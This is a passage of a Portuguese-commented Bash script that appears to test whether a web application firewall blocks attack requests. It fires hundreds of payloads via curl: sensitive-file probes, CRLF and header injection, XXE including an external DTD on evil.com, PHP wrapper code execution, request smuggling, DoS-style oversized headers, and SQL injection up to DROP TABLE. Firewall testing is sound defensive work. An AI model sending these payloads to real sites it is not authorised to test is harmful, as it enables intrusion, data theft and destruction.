    test_curl "Host: 192.168.1.1" "block" -A "$UA" -Lk -H "Host: 192.168.1.1" "$URL"
}

#==============================================================================
# URI MALICIOSA (10 testes)
#==============================================================================
test_malicious_uri() {
    print_section "🔗 TESTES DE URI MALICIOSA - WORDPRESS (50 testes)"
    
    print_subsection "Arquivos de Configuração WordPress"
    test_curl "WP: wp-config.php" "block" -A "$UA" -Lk "${URL}/wp-config.php"
    test_curl "WP: wp-config.php.bak" "block" -A "$UA" -Lk "${URL}/wp-config.php.bak"
    test_curl "WP: wp-config.php.old" "block" -A "$UA" -Lk "${URL}/wp-config.php.old"
    test_curl "WP: wp-config.php.save" "block" -A "$UA" -Lk "${URL}/wp-config.php.save"
    test_curl "WP: wp-config.php.swp" "block" -A "$UA" -Lk "${URL}/wp-config.php.swp"
    test_curl "WP: wp-config.php~" "block" -A "$UA" -Lk "${URL}/wp-config.php~"
    test_curl "WP: wp-config.txt" "block" -A "$UA" -Lk "${URL}/wp-config.txt"
    test_curl "WP: wp-config-sample.php" "block" -A "$UA" -Lk "${URL}/wp-config-sample.php"
    
    print_subsection "Instalação e Debug WordPress"
    test_curl "WP: wp-admin/install.php" "block" -A "$UA" -Lk "${URL}/wp-admin/install.php"
    test_curl "WP: wp-admin/setup-config.php" "block" -A "$UA" -Lk "${URL}/wp-admin/setup-config.php"
    test_curl "WP: wp-admin/upgrade.php" "block" -A "$UA" -Lk "${URL}/wp-admin/upgrade.php"
    test_curl "WP: wp-includes/version.php" "block" -A "$UA" -Lk "${URL}/wp-includes/version.php"
    test_curl "WP: debug.log" "block" -A "$UA" -Lk "${URL}/wp-content/debug.log"
    test_curl "WP: error_log" "block" -A "$UA" -Lk "${URL}/error_log"
    test_curl "WP: php_errorlog" "block" -A "$UA" -Lk "${URL}/php_errorlog"
    
    print_subsection "XMLRPC e REST API Attacks"
    test_curl "WP: xmlrpc.php (POST)" "block" -A "$UA" -Lk -X POST "${URL}/xmlrpc.php"
    test_curl "WP: xmlrpc.php (GET)" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
    test_curl "WP: wp-json/wp/v2/users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
    test_curl "WP: ?author=1 (enum)" "block" -A "$UA" -Lk "${URL}/?author=1"
    test_curl "WP: ?rest_route=/wp/v2/users" "block" -A "$UA" -Lk "${URL}/?rest_route=/wp/v2/users"
    
    print_subsection "Plugins Vulneráveis Conhecidos"
    test_curl "WP: revslider upload" "block" -A "$UA" -Lk "${URL}/wp-admin/admin-ajax.php?action=revslider_show_image"
    test_curl "WP: timthumb.php" "block" -A "$UA" -Lk "${URL}/wp-content/themes/starter/timthumb.php"
    test_curl "WP: uploadify.php" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/uploadify/uploadify.php"
    test_curl "WP: wp-file-manager" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    test_curl "WP: duplicator installer" "block" -A "$UA" -Lk "${URL}/dup-installer/main.installer.php"
    test_curl "WP: backup-db" "block" -A "$UA" -Lk "${URL}/wp-content/backup-db/"
    test_curl "WP: backwpup" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/backwpup/tmp/"
    
    print_subsection "Uploads e Shells"
    test_curl "WP: uploads listagem" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/"
    test_curl "WP: uploads PHP" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/shell.php"
    test_curl "WP: uploads backdoor" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/2024/01/shell.php"
    test_curl "WP: uploads .htaccess" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/.htaccess"
    test_curl "WP: themes PHP exec" "block" -A "$UA" -Lk "${URL}/wp-content/themes/theme/cmd.php"
    
    print_subsection "Arquivos Sensíveis Gerais"
    test_curl "URI: .htaccess" "block" -A "$UA" -Lk "${URL}/.htaccess"
    test_curl "URI: .htpasswd" "block" -A "$UA" -Lk "${URL}/.htpasswd"
    test_curl "URI: .env" "block" -A "$UA" -Lk "${URL}/.env"
    test_curl "URI: .env.local" "block" -A "$UA" -Lk "${URL}/.env.local"
    test_curl "URI: .git/config" "block" -A "$UA" -Lk "${URL}/.git/config"
    test_curl "URI: .git/HEAD" "block" -A "$UA" -Lk "${URL}/.git/HEAD"
    test_curl "URI: .svn/entries" "block" -A "$UA" -Lk "${URL}/.svn/entries"
    test_curl "URI: .DS_Store" "block" -A "$UA" -Lk "${URL}/.DS_Store"
    
    print_subsection "Backups e Dumps"
    test_curl "URI: dump.sql" "block" -A "$UA" -Lk "${URL}/dump.sql"
    test_curl "URI: database.sql" "block" -A "$UA" -Lk "${URL}/database.sql"
    test_curl "URI: backup.sql" "block" -A "$UA" -Lk "${URL}/backup.sql"
    test_curl "URI: db.sql" "block" -A "$UA" -Lk "${URL}/db.sql"
    test_curl "URI: backup.zip" "block" -A "$UA" -Lk "${URL}/backup.zip"
    test_curl "URI: backup.tar.gz" "block" -A "$UA" -Lk "${URL}/backup.tar.gz"
    test_curl "URI: site.zip" "block" -A "$UA" -Lk "${URL}/site.zip"
    
    print_subsection "Ferramentas de Debug/Admin"
    test_curl "URI: phpinfo.php" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "URI: info.php" "block" -A "$UA" -Lk "${URL}/info.php"
    test_curl "URI: adminer.php" "block" -A "$UA" -Lk "${URL}/adminer.php"
    test_curl "URI: phpmyadmin" "block" -A "$UA" -Lk "${URL}/phpmyadmin/"
    test_curl "URI: pma" "block" -A "$UA" -Lk "${URL}/pma/"
}

#==============================================================================
# HEADER INJECTION (10 testes)
#==============================================================================
test_header_injection() {
    print_section "💉 TESTES DE HEADER INJECTION (20 testes)"
    
    print_subsection "CRLF Injection"
    test_curl "CRLF: Básico" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: hacked' "$URL"
    test_curl "CRLF: Set-Cookie" "block" -A "$UA" -Lk -H $'X-Test: test\r\nSet-Cookie: admin=true' "$URL"
    test_curl "CRLF: Location redirect" "block" -A "$UA" -Lk -H $'X-Test: test\r\nLocation: http://evil.com' "$URL"
    test_curl "CRLF: Content-Type" "block" -A "$UA" -Lk -H $'X-Test: test\r\nContent-Type: text/html' "$URL"
    test_curl "CRLF: Double CRLF (body)" "block" -A "$UA" -Lk -H $'X-Test: test\r\n\r\n<html>injected</html>' "$URL"
    
    print_subsection "Header Override Attacks"
    test_curl "X-Forwarded-Host: evil.com" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "$URL"
    test_curl "X-Forwarded-Proto: http" "block" -A "$UA" -Lk -H "X-Forwarded-Proto: http" "$URL"
    test_curl "X-Original-URL: /admin" "block" -A "$UA" -Lk -H "X-Original-URL: /admin" "$URL"
    test_curl "X-Rewrite-URL: /admin" "block" -A "$UA" -Lk -H "X-Rewrite-URL: /admin" "$URL"
    test_curl "X-HTTP-Method-Override: DELETE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: DELETE" "$URL"
    test_curl "X-HTTP-Method-Override: PUT" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: PUT" "$URL"
    test_curl "X-HTTP-Method-Override: TRACE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: TRACE" "$URL"
    
    print_subsection "Payloads em Headers"
    test_curl "Header: SQL Injection" "block" -A "$UA" -Lk -H "X-Custom: ' OR '1'='1" "$URL"
    test_curl "Header: XSS" "block" -A "$UA" -Lk -H "X-Custom: <script>alert(1)</script>" "$URL"
    test_curl "Header: Null byte" "block" -A "$UA" -Lk -H "X-Custom: admin%00" "$URL"
    test_curl "Header: Path traversal" "block" -A "$UA" -Lk -H "X-Custom: ../../etc/passwd" "$URL"
    test_curl "Header: Command injection" "block" -A "$UA" -Lk -H "X-Custom: ;cat /etc/passwd" "$URL"
    test_curl "Header: Template injection" "block" -A "$UA" -Lk -H "X-Custom: {{7*7}}" "$URL"
    test_curl "Header: Muito longo (8KB)" "block" -A "$UA" -Lk -H "X-Long: $(head -c 8000 /dev/zero | tr '\0' 'A')" "$URL"
}

#==============================================================================
# CONTENT-TYPE ATTACKS (20 testes)
#==============================================================================
test_content_type() {
    print_section "📄 TESTES DE CONTENT-TYPE ATTACKS (20 testes)"
    
    print_subsection "XXE e XML Attacks"
    test_curl "CT: XXE básico" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
    test_curl "CT: XXE com DTD externa" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo></foo>' "$URL"
    test_curl "CT: XXE parameter entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>' "$URL"
    test_curl "CT: SOAP injection" "block" -A "$UA" -Lk -H "Content-Type: application/soap+xml" -d '<?xml version="1.0"?><soap:Envelope><soap:Body><x>test</x></soap:Body></soap:Envelope>' "$URL"
    
    print_subsection "XSS via Content-Type"
    test_curl "CT: SVG XSS" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" -d '<svg onload="alert(1)">' "$URL"
    test_curl "CT: HTML XSS" "block" -A "$UA" -Lk -H "Content-Type: text/html" -d "<script>alert(1)</script>" "$URL"
    test_curl "CT: XHTML XSS" "block" -A "$UA" -Lk -H "Content-Type: application/xhtml+xml" -d '<html><script>alert(1)</script></html>' "$URL"
    
    print_subsection "Charset e Encoding Attacks"
    test_curl "CT: UTF-7 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-7" "$URL"
    test_curl "CT: UTF-32 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-32" "$URL"
    test_curl "CT: ISO-2022-JP" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=ISO-2022-JP" "$URL"
    
    print_subsection "MIME Type Confusion"
    test_curl "CT: multipart sem boundary" "block" -A "$UA" -Lk -H "Content-Type: multipart/form-data" "$URL"
    test_curl "CT: application/x-httpd-php" "block" -A "$UA" -Lk -H "Content-Type: application/x-httpd-php" -d "<?php system('id'); ?>" "$URL"
    test_curl "CT: tipo inexistente" "block" -A "$UA" -Lk -H "Content-Type: evil/payload" "$URL"
    test_curl "CT: application/octet-stream" "block" -A "$UA" -Lk -H "Content-Type: application/octet-stream" -d "malicious binary" "$URL"
    test_curl "CT: text/x-php" "block" -A "$UA" -Lk -H "Content-Type: text/x-php" "$URL"
    
    print_subsection "Payload Injection"
    test_curl "CT: SQLi em form" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin' OR 1=1--" "$URL"
    test_curl "CT: JSON SQLi" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":"admin\u0027 OR 1=1--"}' "$URL"
    test_curl "CT: CRLF em Content-Type" "block" -A "$UA" -Lk -H $'Content-Type: text/html\r\nX-Injected: true' "$URL"
    test_curl "CT: muito longo" "block" -A "$UA" -Lk -H "Content-Type: text/$(head -c 1000 /dev/zero | tr '\0' 'A')" "$URL"
}

#==============================================================================
# ACCEPT-ENCODING ATTACKS (20 testes)
#==============================================================================
test_accept_encoding() {
    print_section "🗜️ TESTES DE ACCEPT-ENCODING ATTACKS (20 testes)"
    
    print_subsection "Encoding Manipulation"
    test_curl "AE: muitos encodings" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip, deflate, br, compress, identity, *, sdch, xz, lzma, zstd" "$URL"
    test_curl "AE: encoding repetido x100" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'gzip,%.0s' {1..100})" "$URL"
    test_curl "AE: encoding repetido x500" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'deflate,%.0s' {1..500})" "$URL"
    test_curl "AE: chunked (smuggling)" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked" "$URL"
    test_curl "AE: transfer-encoding em AE" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked, gzip" "$URL"
    
    print_subsection "Payload Injection em AE"
    test_curl "AE: XSS" "block" -A "$UA" -Lk -H "Accept-Encoding: <script>alert(1)</script>" "$URL"
    test_curl "AE: SQL Injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ' OR 1=1--" "$URL"
    test_curl "AE: path traversal" "block" -A "$UA" -Lk -H "Accept-Encoding: ../../etc/passwd" "$URL"
    test_curl "AE: command injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ;cat /etc/passwd" "$URL"
    test_curl "AE: null byte" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip%00deflate" "$URL"
    
    print_subsection "CRLF e Malformed"
    test_curl "AE: CRLF injection" "block" -A "$UA" -Lk -H $'Accept-Encoding: gzip\r\nX-Injected: true' "$URL"
    test_curl "AE: encoding inexistente" "block" -A "$UA" -Lk -H "Accept-Encoding: evil-encoding-doom" "$URL"
    test_curl "AE: q-value malicioso" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=99999999" "$URL"
    test_curl "AE: q-value negativo" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=-1" "$URL"
    test_curl "AE: caracteres especiais" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=<script>" "$URL"
    
    print_subsection "Overflow"
    test_curl "AE: 2KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 2000 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "AE: 4KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 4000 /dev/zero | tr '\0' 'B')" "$URL"
    test_curl "AE: 8KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 8000 /dev/zero | tr '\0' 'C')" "$URL"
    test_curl "AE: com wildcards" "block" -A "$UA" -Lk -H "Accept-Encoding: *, gzip;q=0, deflate;q=0" "$URL"
    test_curl "AE: identity negado" "block" -A "$UA" -Lk -H "Accept-Encoding: identity;q=0, *;q=0" "$URL"
}

#==============================================================================
# X-FORWARDED-FOR SPOOFING (20 testes)
#==============================================================================
test_xff_spoofing() {
    print_section "🌐 TESTES DE X-FORWARDED-FOR SPOOFING (20 testes)"
    
    print_subsection "IP Privado/Local"
    test_curl "XFF: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 127.0.0.1" "$URL"
    test_curl "XFF: localhost" "block" -A "$UA" -Lk -H "X-Forwarded-For: localhost" "$URL"
    test_curl "XFF: 192.168.1.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 192.168.1.1" "$URL"
    test_curl "XFF: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 10.0.0.1" "$URL"
    test_curl "XFF: 172.16.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 172.16.0.1" "$URL"
    test_curl "XFF: ::1 (IPv6)" "block" -A "$UA" -Lk -H "X-Forwarded-For: ::1" "$URL"
    test_curl "XFF: 0.0.0.0" "block" -A "$UA" -Lk -H "X-Forwarded-For: 0.0.0.0" "$URL"
    
    print_subsection "Cloud Metadata IPs"
    test_curl "XFF: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.169.254" "$URL"
    test_curl "XFF: 169.254.170.2 (AWS ECS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.170.2" "$URL"
    test_curl "XFF: 100.100.100.200 (Alibaba)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 100.100.100.200" "$URL"
    
    print_subsection "Payload Injection"
    test_curl "XFF: SQL Injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ' OR 1=1--" "$URL"
    test_curl "XFF: XSS" "block" -A "$UA" -Lk -H "X-Forwarded-For: <script>alert(1)</script>" "$URL"
    test_curl "XFF: Command injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ;cat /etc/passwd" "$URL"
    test_curl "XFF: CRLF injection" "block" -A "$UA" -Lk -H $'X-Forwarded-For: 1.2.3.4\r\nX-Injected: true' "$URL"
    
    print_subsection "Multiple IPs e Headers Alternativos"
    test_curl "XFF: múltiplos IPs" "block" -A "$UA" -Lk -H "X-Forwarded-For: 8.8.8.8, 127.0.0.1, 192.168.1.1" "$URL"
    test_curl "X-Real-IP: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Real-IP: 127.0.0.1" "$URL"
    test_curl "X-Client-IP: 192.168.0.1" "block" -A "$UA" -Lk -H "X-Client-IP: 192.168.0.1" "$URL"
    test_curl "X-Originating-IP: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Originating-IP: 10.0.0.1" "$URL"
    test_curl "X-Remote-IP: localhost" "block" -A "$UA" -Lk -H "X-Remote-IP: localhost" "$URL"
    test_curl "X-Remote-Addr: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Remote-Addr: 127.0.0.1" "$URL"
}

#==============================================================================
# RANGE HEADER ATTACKS (20 testes)
#==============================================================================
test_range_header() {
    print_section "📊 TESTES DE RANGE HEADER ATTACKS (20 testes)"
    
    print_subsection "Range DoS"
    test_curl "Range: 10 ranges" "block" -A "$UA" -Lk -H "Range: bytes=0-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9" "$URL"
    test_curl "Range: 50 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 100); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
    test_curl "Range: 100 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 200); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
    test_curl "Range: overlapping" "block" -A "$UA" -Lk -H "Range: bytes=0-100,50-150,100-200,150-250" "$URL"
    
    print_subsection "Range Malformado"
    test_curl "Range: bytes=-1" "block" -A "$UA" -Lk -H "Range: bytes=-1" "$URL"
    test_curl "Range: muito grande" "block" -A "$UA" -Lk -H "Range: bytes=0-99999999999999999" "$URL"
    test_curl "Range: negativo" "block" -A "$UA" -Lk -H "Range: bytes=-99999999999" "$URL"
    test_curl "Range: invertido" "block" -A "$UA" -Lk -H "Range: bytes=100-0" "$URL"
    test_curl "Range: sem número" "block" -A "$UA" -Lk -H "Range: bytes=abc-xyz" "$URL"
    test_curl "Range: formato inválido" "block" -A "$UA" -Lk -H "Range: invalid-format-attack" "$URL"
    
    print_subsection "Payload em Range"
    test_curl "Range: XSS" "block" -A "$UA" -Lk -H "Range: bytes=<script>alert(1)</script>" "$URL"
    test_curl "Range: SQL Injection" "block" -A "$UA" -Lk -H "Range: bytes=' OR 1=1--" "$URL"
    test_curl "Range: Command injection" "block" -A "$UA" -Lk -H "Range: bytes=;cat /etc/passwd" "$URL"
    test_curl "Range: Path traversal" "block" -A "$UA" -Lk -H "Range: bytes=../../etc/passwd" "$URL"
    test_curl "Range: Null byte" "block" -A "$UA" -Lk -H "Range: bytes=0-100%00" "$URL"
    
    print_subsection "Range Overflow"
    test_curl "Range: INT_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483647" "$URL"
    test_curl "Range: INT_MAX+1" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483648" "$URL"
    test_curl "Range: LONG_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-9223372036854775807" "$URL"
    test_curl "Range: header muito longo" "block" -A "$UA" -Lk -H "Range: bytes=$(head -c 5000 /dev/zero | tr '\0' '1')" "$URL"
    test_curl "Range: unidade inválida" "block" -A "$UA" -Lk -H "Range: evil=0-100" "$URL"
}

#==============================================================================
# HTTP SMUGGLING ATTACKS (20 testes)
#==============================================================================
test_http_smuggling() {
    print_section "🚢 TESTES DE HTTP SMUGGLING (20 testes)"
    
    print_subsection "CL.TE e TE.CL"
    test_curl "Smuggling: CL + TE" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Transfer-Encoding: chunked" "$URL"
    test_curl "Smuggling: TE + CL" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Content-Length: 0" "$URL"
    test_curl "Smuggling: CL duplicado diferente" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Content-Length: 100" "$URL"
    test_curl "Smuggling: TE duplicado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
    
    print_subsection "Transfer-Encoding Obfuscation"
    test_curl "Smuggling: TE com espaço" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked " "$URL"
    test_curl "Smuggling: TE com tab" "block" -A "$UA" -Lk -H $'Transfer-Encoding:\tchunked' "$URL"
    test_curl "Smuggling: TE + identity" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked, identity" "$URL"
    test_curl "Smuggling: TE com newline" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\n' "$URL"
    test_curl "Smuggling: TE capitalizado" "block" -A "$UA" -Lk -H "Transfer-Encoding: ChUnKeD" "$URL"
    test_curl "Smuggling: X-Transfer-Encoding" "block" -A "$UA" -Lk -H "X-Transfer-Encoding: chunked" "$URL"
    test_curl "Smuggling: Transfer_Encoding" "block" -A "$UA" -Lk -H "Transfer_Encoding: chunked" "$URL"
    
    print_subsection "Content-Length Manipulation"
    test_curl "Smuggling: CL negativo" "block" -A "$UA" -Lk -H "Content-Length: -1" "$URL"
    test_curl "Smuggling: CL muito grande" "block" -A "$UA" -Lk -H "Content-Length: 999999999999" "$URL"
    test_curl "Smuggling: CL zero com body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden data" "$URL"
    test_curl "Smuggling: CL decimal" "block" -A "$UA" -Lk -H "Content-Length: 10.5" "$URL"
    test_curl "Smuggling: CL hex" "block" -A "$UA" -Lk -H "Content-Length: 0x10" "$URL"
    
    print_subsection "CRLF e Headers Malformados"
    test_curl "Smuggling: TE com CRLF" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\r\n: x' "$URL"
    test_curl "Smuggling: linha vazia antes" "block" -A "$UA" -Lk -H $'\r\nTransfer-Encoding: chunked' "$URL"
    test_curl "Smuggling: espaço antes do :" "block" -A "$UA" -Lk -H "Transfer-Encoding : chunked" "$URL"
    test_curl "Smuggling: múltiplos espaços" "block" -A "$UA" -Lk -H "Transfer-Encoding:    chunked" "$URL"
}

#==============================================================================
# NGINX SPECIFIC ATTACKS (20 testes)
#==============================================================================
test_nginx_attacks() {
    print_section "🔧 TESTES DE ATAQUES AO NGINX (20 testes)"
    
    print_subsection "Path Traversal e Alias"
    test_curl "Nginx: path traversal básico" "block" -A "$UA" -Lk "${URL}/../../../etc/passwd"
    test_curl "Nginx: path traversal encoded" "block" -A "$UA" -Lk "${URL}/..%2f..%2f..%2fetc/passwd"
    test_curl "Nginx: path traversal double" "block" -A "$UA" -Lk "${URL}/....//....//etc/passwd"
    test_curl "Nginx: alias traversal" "block" -A "$UA" -Lk "${URL}/static../etc/passwd"
    test_curl "Nginx: null byte" "block" -A "$UA" -Lk "${URL}/index.php%00.jpg"
    
    print_subsection "Buffer Overflow"
    test_curl "Nginx: URI muito longa (4KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 4000 /dev/zero | tr '\0' 'A')"
    test_curl "Nginx: URI muito longa (8KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 8000 /dev/zero | tr '\0' 'B')"
    test_curl "Nginx: muitos headers" "block" -A "$UA" -Lk $(for i in {1..100}; do echo -n "-H 'X-Header-$i: value' "; done) "$URL"
    
    print_subsection "Configuração Exposta"
    test_curl "Nginx: nginx.conf" "block" -A "$UA" -Lk "${URL}/nginx.conf"
    test_curl "Nginx: /server-status" "block" -A "$UA" -Lk "${URL}/server-status"
    test_curl "Nginx: /nginx_status" "block" -A "$UA" -Lk "${URL}/nginx_status"
    test_curl "Nginx: /status" "block" -A "$UA" -Lk "${URL}/status"
    test_curl "Nginx: /.nginx" "block" -A "$UA" -Lk "${URL}/.nginx"
    
    print_subsection "Slowloris e DoS"
    test_curl "Nginx: header parcial" "block" -A "$UA" -Lk -H "X-Slow: " "$URL"
    test_curl "Nginx: muitos cookies" "block" -A "$UA" -Lk --cookie "$(for i in {1..200}; do echo -n "c$i=v;"; done)" "$URL"
    
    print_subsection "Requests Malformados"
    test_curl "Nginx: HTTP/0.9" "block" -A "$UA" -Lk --http0.9 "$URL" 2>/dev/null || echo "  [?] HTTP/0.9 não suportado"
    test_curl "Nginx: duplo // path" "block" -A "$UA" -Lk "${URL}//admin//secret"
    test_curl "Nginx: backslash path" "block" -A "$UA" -Lk "${URL}/admin\\..\\secret"
    test_curl "Nginx: CONNECT internal" "block" -A "$UA" -Lk -X CONNECT "${URL}:443"
    test_curl "Nginx: Host com porta" "block" -A "$UA" -Lk -H "Host: localhost:22" "$URL"
}

#==============================================================================
# PHP SPECIFIC ATTACKS (20 testes)
#==============================================================================
test_php_attacks() {
    print_section "🐘 TESTES DE ATAQUES AO PHP (20 testes)"
    
    print_subsection "PHP Wrappers e Streams"
    test_curl "PHP: php://filter base64" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
    test_curl "PHP: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input" -d "<?php system('id'); ?>"
    test_curl "PHP: php://stdin" "block" -A "$UA" -Lk "${URL}?file=php://stdin"
    test_curl "PHP: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
    test_curl "PHP: data://" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php system('id'); ?>"
    test_curl "PHP: phar://" "block" -A "$UA" -Lk "${URL}?file=phar://exploit.phar"
    test_curl "PHP: zip://" "block" -A "$UA" -Lk "${URL}?file=zip://exploit.zip%23shell.php"
    
    print_subsection "Deserialization"
    test_curl "PHP: unserialize O:" "block" -A "$UA" -Lk "${URL}?data=O:8:\"stdClass\":0:{}"
    test_curl "PHP: unserialize a:" "block" -A "$UA" -Lk "${URL}?data=a:1:{s:4:\"test\";s:4:\"data\";}"
    test_curl "PHP: serialize gadget" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d 'data=O:7:"Exploit":1:{s:4:"file";s:11:"/etc/passwd";}' "$URL"
    
    print_subsection "Code Injection"
    test_curl "PHP: eval()" "block" -A "$UA" -Lk "${URL}?code=phpinfo()"
    test_curl "PHP: assert()" "block" -A "$UA" -Lk "${URL}?code=assert('system(\"id\")')"
    test_curl "PHP: preg_replace /e" "block" -A "$UA" -Lk "${URL}?pattern=/e&replace=system('id')"
    test_curl "PHP: create_function" "block" -A "$UA" -Lk "${URL}?func=}system('id');//"
    test_curl "PHP: backticks" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
    
    print_subsection "Info Disclosure"
    test_curl "PHP: phpinfo()" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "PHP: php-info" "block" -A "$UA" -Lk "${URL}/php-info.php"
    test_curl "PHP: test.php" "block" -A "$UA" -Lk "${URL}/test.php"
    test_curl "PHP: info.php" "block" -A "$UA" -Lk "${URL}/info.php"
    test_curl "PHP: php.ini exposed" "block" -A "$UA" -Lk "${URL}/php.ini"
}

#==============================================================================
# DATABASE ATTACKS - MySQL/MariaDB (20 testes)
#==============================================================================
test_database_attacks() {
    print_section "🗄️ TESTES DE ATAQUES A DATABASE (20 testes)"
    
    print_subsection "SQL Injection - Clássico"
    test_curl "DB: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1' OR '1'='1"
    test_curl "DB: OR 1=1 comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1--"
    test_curl "DB: OR 1=1 hash comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1#"
    test_curl "DB: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT 1,2,3--"
    test_curl "DB: UNION ALL SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION ALL SELECT 1,user(),database()--"
    
    print_subsection "SQL Injection - Time Based"
    test_curl "DB: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
    test_curl "DB: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(10000000,SHA1('test'))--"
    test_curl "DB: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
    
    print_subsection "SQL Injection - Out of Band"
    test_curl "DB: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO OUTFILE '/tmp/test.txt'--"
    test_curl "DB: INTO DUMPFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO DUMPFILE '/tmp/test.txt'--"
    test_curl "DB: LOAD_FILE" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT LOAD_FILE('/etc/passwd')--"
    
    print_subsection "SQL Injection - Stacked Queries"
    test_curl "DB: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1'; DROP TABLE users--"
    test_curl "DB: DELETE FROM" "block" -A "$UA" -Lk "${URL}?id=1'; DELETE FROM users--"
    test_curl "DB: UPDATE SET" "block" -A "$UA" -Lk "${URL}?id=1'; UPDATE users SET admin=1--"
    test_curl "DB: INSERT INTO" "block" -A "$UA" -Lk "${URL}?id=1'; INSERT INTO users VALUES('hacker','pass')--"
    
    print_subsection "MySQL/MariaDB Específico"
    test_curl "DB: @@version" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT @@version--"
    test_curl "DB: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--"
    test_curl "DB: HEX encoded" "block" -A "$UA" -Lk "${URL}?id=0x31204f5220313d31"
